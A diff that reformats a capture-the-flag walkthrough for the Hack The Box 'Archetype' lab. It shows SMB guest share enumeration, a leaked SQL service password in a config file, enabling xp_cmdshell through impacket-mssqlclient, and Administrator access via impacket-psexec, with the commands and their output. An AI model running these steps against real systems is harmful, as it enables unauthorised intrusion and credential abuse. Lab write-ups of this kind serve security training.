@@ -1,6 +1,7 @@
 =====================================================================================
 1. Port 445 is open the user is defined as "Guest"
-  smbclient -L \\10.129.95.187\\ -U 'guest'
+```bash  
+smbclient -L \\10.129.95.187\\ -U 'guest'
 Password for [WORKGROUP\guest]:
 
         Sharename       Type      Comment
@@ -12,8 +13,10 @@ Password for [WORKGROUP\guest]:
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.129.95.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
+```
 ======================================================================================
 2. Check the additional share name.
+```bash
 mbclient //10.129.95.187/backups -U 'guest'
 Password for [WORKGROUP\guest]:
 Try "help" to get a list of possible commands.
@@ -27,9 +30,11 @@ smb: \> get prod.config
 NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \prod.config
 smb: \> get prod.dtsConfig 
 getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
-smb: \> 
+smb: \>
+```
 ==========================================================================================
 3. There is something inside of it.
+```bash
 ┌──(sabeshan㉿kali)-[~/HTB/startpoint]
 └─$ cat prod.dtsConfig 
 <DTSConfiguration>
@@ -39,9 +44,11 @@ smb: \>
     <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
         <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
     </Configuration>
-</DTSConfiguration> 
+</DTSConfiguration>
+```
 ===============================================================================================
 4. It enters to a mssql 
+```bash
 impacket-mssqlclient ARCHETYPE/sql_svc@10.129.95.187 -windows-auth 
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -54,9 +61,11 @@ Password:
 [*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
 [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
 [!] Press help for extra shell commands
-SQL (ARCHETYPE\sql_svc  dbo@master)> 
+SQL (ARCHETYPE\sql_svc  dbo@master)>
+```
 ===================================================================================================
 5. Get the initial access with xp_cmdshell
+```bash
 ->EXEC sp_configure 'show advanced options', 1;
 ->RECONFIGURE;
 ->sp_configure; - Enabling the sp_configure as stated in the above error message
@@ -73,9 +82,11 @@ exit
 
 NULL                                                                      
 
-SQL (ARCHETYPE\sql_svc  dbo@master)> 
+SQL (ARCHETYPE\sql_svc  dbo@master)>
+```
 ==========================================================================================================
 6.Finally i got the system in the machine
+```bash
 impacket-psexec Administrator@10.129.95.187                        
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -90,6 +101,7 @@ Password:
 Microsoft Windows [Version 10.0.17763.2061]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
-C:\Windows\system32> 
+C:\Windows\system32>
+```
 ==============================================================================================================
 
